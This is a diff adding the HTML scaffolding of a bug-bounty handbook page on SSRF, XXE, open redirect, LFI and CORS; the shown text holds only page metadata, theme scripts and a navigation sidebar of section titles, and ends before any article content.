@@ -1,0 +1,2671 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Server-side vulnerabilities that reach internal infrastructure, read local files, or cross trust boundaries. SSRF alone has produced some of the largest bug bounty payouts ever recorded.">
+      
+      
+        <meta name="author" content="Wellington Vumu">
+      
+      
+      
+        <link rel="prev" href="../part-04-injection/">
+      
+      
+        <link rel="next" href="../part-06-business-logic/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.39">
+    
+    
+      
+        <title>SSRF, XXE, Open Redirect, LFI, CORS - Hunter's handbook</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../assets/stylesheets/modern/main.1e981d71.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ssrf-xxe-open-redirect-lfi-cors" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-header__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hunter's handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SSRF, XXE, Open Redirect, LFI, CORS
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-nav__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    Hunter's handbook
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="./.." class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-rocket" viewBox="0 0 24 24"><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09"/><path d="M9 12a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.4 22.4 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 .05 5 .05"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-01-recon/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-02-authentication/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-round-key" viewBox="0 0 24 24"><path d="M19 11v6M19 13h2M2 21a8 8 0 0 1 12.868-6.349"/><circle cx="10" cy="8" r="5"/><circle cx="19" cy="19" r="2"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-03-access-control/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-lock" viewBox="0 0 24 24"><path d="M19 16v-2a2 2 0 0 0-4 0v2M9.5 15H7a4 4 0 0 0-4 4v2"/><circle cx="10" cy="7" r="4"/><rect width="8" height="5" x="13" y="16" rx=".899"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-04-injection/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-syringe" viewBox="0 0 24 24"><path d="m18 2 4 4M17 7l3-3M19 9 8.7 19.3c-1 1-2.5 1-3.4 0l-.6-.6c-1-1-1-2.5 0-3.4L15 5M9 11l4 4M5 19l-3 3M14 4l6 6"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server" viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><path d="M6 6h.01M6 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF & XXE
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server" viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><path d="M6 6h.01M6 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF & XXE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#51-server-side-request-forgery-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1 Server-Side Request Forgery (SSRF)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.1 Server-Side Request Forgery (SSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#511-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#512-cloud-metadata-endpoint-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.2 Cloud Metadata Endpoint Attacks
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#513-ssrf-filter-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.3 SSRF Filter Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#514-internal-port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.4 Internal Port Scanning
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#515-ssrf-feature-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.5 SSRF Feature Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#52-open-redirect" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.2 Open Redirect
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.2 Open Redirect">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#521-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.2.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#522-bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.2.2 Bypass Techniques
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#523-chaining-open-redirect" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.2.3 Chaining Open Redirect
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#53-xxe-xml-external-entity" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3 XXE (XML External Entity)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.3 XXE (XML External Entity)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#531-classic-file-read" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.1 Classic File Read
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#532-blind-xxe-oob-via-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.2 Blind XXE (OOB via DTD)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#533-xxe-via-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.3 XXE via File Upload
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#534-soap-endpoints" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.4 SOAP Endpoints
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#535-xxe-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.5 XXE → SSRF
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#536-xxe-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.6 XXE Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#54-local-file-inclusion--path-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4 Local File Inclusion / Path Traversal
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.4 Local File Inclusion &#x2f; Path Traversal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#541-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#542-filter-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4.2 Filter Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#543-lfi-to-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4.3 LFI to RCE
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#544-high-value-file-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4.4 High-Value File Targets
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#55-host-header-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.5 Host Header Injection
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.5 Host Header Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#551-web-cache-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.5.1 Web Cache Poisoning
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#552-ssrf-via-host-header-routing" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.5.2 SSRF via Host Header Routing
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#56-http-request-smuggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.6 HTTP Request Smuggling
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.6 HTTP Request Smuggling">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#561-safe-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.6.1 Safe Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#57-cors-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.7 CORS Misconfiguration
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.7 CORS Misconfiguration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#571-reflected-origin" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.7.1 Reflected Origin
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#572-null-origin-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.7.2 Null Origin Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#573-subdomain-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.7.3 Subdomain Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-5-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 5 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-06-business-logic/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain" viewBox="0 0 24 24"><path d="M12 18V5M15 13a4.17 4.17 0 0 1-3-4 4.17 4.17 0 0 1-3 4M17.598 6.5A3 3 0 1 0 12 5a3 3 0 1 0-5.598 1.5"/><path d="M17.997 5.125a4 4 0 0 1 2.526 5.77"/><path d="M18 18a4 4 0 0 0 2-7.464"/><path d="M19.967 17.483A4 4 0 1 1 12 18a4 4 0 1 1-7.967-.517"/><path d="M6 18a4 4 0 0 1-2-7.464"/><path d="M6.003 5.125a4 4 0 0 0-2.526 5.77"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-07-api/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cog" viewBox="0 0 24 24"><path d="M11 10.27 7 3.34M11 13.73l-4 6.93M12 22v-2M12 2v2M14 12h8M17 20.66l-1-1.73M17 3.34l-1 1.73M2 12h2M20.66 17l-1.73-1M20.66 7l-1.73 1M3.34 17l1.73-1M3.34 7l1.73 1"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="12" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    API Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-08-ai-llm/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain-circuit" viewBox="0 0 24 24"><path d="M12 5a3 3 0 1 0-5.997.125 4 4 0 0 0-2.526 5.77 4 4 0 0 0 .556 6.588A4 4 0 1 0 12 18Z"/><path d="M9 13a4.5 4.5 0 0 0 3-4M6.003 5.125A3 3 0 0 0 6.401 6.5M3.477 10.896a4 4 0 0 1 .585-.396M6 18a4 4 0 0 1-1.967-.516M12 13h4M12 18h6a2 2 0 0 1 2 2v1M12 8h8M16 8V5a2 2 0 0 1 2-2"/><circle cx="16" cy="13" r=".5"/><circle cx="18" cy="3" r=".5"/><circle cx="20" cy="21" r=".5"/><circle cx="20" cy="8" r=".5"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    AI & LLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-09-cloud/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cloud" viewBox="0 0 24 24"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-10-mobile/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-smartphone" viewBox="0 0 24 24"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-11-reporting/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-notebook-pen" viewBox="0 0 24 24"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4M2 6h4M2 10h4M2 14h4M2 18h4"/><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reporting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-12-platform/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-layers" viewBox="0 0 24 24"><path d="M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z"/><path d="M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12"/><path d="M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Platform
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-13-tooling/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-wrench" viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.106-3.105c.32-.322.863-.22.983.218a6 6 0 0 1-8.259 7.057l-7.91 7.91a1 1 0 0 1-2.999-3l7.91-7.91a6 6 0 0 1 7.057-8.259c.438.12.54.662.219.984z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Tooling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-14-infrastructure/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server-cog" viewBox="0 0 24 24"><path d="m10.852 14.772-.383.923M13.148 14.772a3 3 0 1 0-2.296-5.544l-.383-.923M13.148 9.228l.383-.923"/><path d="m13.53 15.696-.382-.924a3 3 0 1 1-2.296-5.544M14.772 10.852l.923-.383M14.772 13.148l.923.383"/><path d="M4.5 10H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-.5M4.5 14H4a2 2 0 0 0-2 2v4a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-4a2 2 0 0 0-2-2h-.5M6 18h.01M6 6h.01M9.228 10.852l-.923-.383M9.228 13.148l-.923.383"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendices/" class="md-nav__link">
+        
+  
+  
